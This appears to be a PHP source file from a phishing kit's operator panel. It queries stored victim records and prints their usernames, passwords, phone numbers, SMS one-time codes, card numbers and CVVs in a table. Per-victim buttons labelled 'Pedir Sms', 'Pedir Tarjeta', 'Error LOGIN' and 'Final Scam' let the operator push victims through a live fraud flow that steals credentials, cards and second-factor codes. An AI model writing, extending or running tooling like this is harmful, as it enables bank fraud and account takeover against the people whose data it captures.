<?php
include './config/config.php';
include './config/db.class.php';
include './config/Panel.php';
include './config/User.php';
$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);

if (!Panel::LoggedIn()) Panel::redirectToLogin();
$info = $db->fetchAll("SELECT DISTINCT * FROM ".$userclass->getTable()." WHERE status < 18 AND site_id = ?", array(Panel::getSiteId()));
foreach($info as $row)
{
    $solicitud = '';
    $final = '<br><a href="?step=10&id='.$row["id"].'"><button type="button" class="btn btn-success btn-sm">Final Scam</button></a>
    <a href="?step=99&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Delete</button></a>';
    if ($row["status"] == 1) 
    {
        $opciones = array(
            'login' => array(
                'bad'=> '<a href="?step=2&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm" >Error LOGIN</button></a>'
            ),
            'phone' => array(
                'bad'   => '<a href="?step=3&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm" >Error Phone</button></a>'
            ),
            'sms' => array(
                'empty' => '<br><a href="?step=4&id='.$row["id"].'"><button type="button" class="btn btn-info btn-sm" >Pedir Sms</button></a>',
                'bad'   => '<br><a href="?step=5&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm" >Error Sms</button></a>
                            <a href="?step=6&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm" >Exp Sms</button></a>'
            ),
            'tarjeta' => array(
                'empty' => '<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-info btn-sm" >Pedir Tarjeta</button></a>',
                'bad'   => '<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm" >Error Tarjeta</button></a>'
            ),
            'caller' => array(
                'empty' => '<a href="?step=13&id='.$row["id"].'"><button type="button" class="btn btn-info btn-sm" >Final Caller</button></a>',
            ),
            'c_cvv' => array(
                'empty' => '<a href="?coor='.$row["id"].'&step=12"><button type="button" class="btn btn-info btn-sm" >Pedir Custom cvv</button></a>',
                'bad'=> '<a href="?coor='.$row["id"].'&step=14"><button type="button" class="btn btn-danger btn-sm" >Error Custom cvv</button></a>'
            ),
            'desv' => array(
                'empty' => '<a href="?desv='.$row["id"].'&step=15"><button type="button" class="btn btn-info btn-sm" >Pedir DESV</button></a>',
                'bad'=> '<a href="?desv='.$row["id"].'&step=16"><button type="button" class="btn btn-danger btn-sm" >Error DESV</button></a>'
            ),
        );
        $solicitud .= $opciones['login']['bad'];

        $phone = (isset($row['phone'])) ? $solicitud .= $opciones['phone']['bad'] : $solicitud .= '';

        $sms   = (isset($row['sms']))   ? $solicitud .= $opciones['sms']['bad']   : $solicitud .= $opciones['sms']['empty'];

        $tarjeta   = (isset($row['cc']))   ? $solicitud .= $opciones['tarjeta']['bad']   : $solicitud .= $opciones['tarjeta']['empty'];

        $c_cvv   = (isset($row['c_cvv']))   ? $solicitud .= $opciones['c_cvv']['bad']   : $solicitud .= $opciones['c_cvv']['empty'];

        $desv   = (isset($row['desv_result']))   ? $solicitud .= $opciones['desv']['bad']   : $solicitud .= $opciones['desv']['empty'];

        $solicitud .= $opciones['caller']['empty'];

        $solicitud .= $final;
        Panel::beep();
    }else {

        $selected = array(
            '0' => array(
                'value'  => '0',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Esperando Datos</button>'.$final
            ),
            '2' => array(
                'value'  => '2',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error LOGIN</button>'.$final
            ),
            '3' => array(
                'value'  => '3',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error Phone</button>'.$final
            ),
            '4'  => array(
                'value' => '4',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Pedir Sms</button>'.$final
            ),
            '5'  => array(
                'value' => '5',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error Sms</button>'.$final
            ),
            '6'  => array(
                'value' => '6',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Exp Sms</button>'.$final
            ),   
            '7' => array(
                'value' => '7',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Pedir Tarjeta</button>'.$final
            ),
            '8' => array(
                'value' => '8',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error Tarjeta</button>'.$final
            ),
            '10' => array(
                'value' => '10',
                'button' => '<button type="button" class="btn btn-success btn-sm">Final Scam</button>
                <a href="?step=11&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Delete</button></a>',
            ),
            '12'  => array(
                'value' => '12',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Pedir Custom cvv</button>'.$final
            ),
            '13' => array(
                'value' => '13',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Final Caller</button>'.$final
            ), 
            '14' => array(
                'value' => '14',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error Custom cvv</button>'.$final
            ),
            '15' => array(
                'value' => '15',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Pedir DESV</button>'.$final
            ),
            '16' => array(
                'value' => '16',
                'button' => '<button type="button" class="btn btn-secondary btn-sm">Error DESV</button>'.$final
            ),
        );
    
        if ($row['status'] == $selected[$row['status']]['value']) 
        {
            $solicitud .= $selected[$row['status']]['button']."<br>";
        }else 
        {
            $solicitud = '<button type="button" class="btn btn-secondary btn-sm">NO OPTIONS</button><br>'.$final;
        }
    }

    $empty = '<b style="color: red">N/A</b>';
    $timeu = '<b style="color: blue">'.$row["updatetime"].'</b>';
    $phone = ($row["phone"]) ?? $empty;
    $sms = ($row["sms"]) ?? $empty;
    $cc = ($row["cc"]) ?? $empty;
    $c_cvv = ($row["c_cvv"]) ?? $empty;
    $cvv = ($row["cvv"]) ?? $empty;
    $desv_result = ($row["desv_result"]) ?? $empty;
    $desv_number = ($row["desv_number"]) ?? $empty;
    echo '
    <tr>
        <td>'.$timeu.'</td>
        <td>'.$row["user"].'</td>
        <td>'.$row["pass"].'</td>
        <td>'.$phone.'</td>
        <td>'.$sms.'</td>
        <td>'.$cc.'</td>
        <td>'.$c_cvv.'</td>
        <td>'.$cvv.'</td>
        <td>'.$desv_result.' : '.$desv_number.'</td>
        <td>'.$solicitud.'</td>
    </tr>';	

}
?>
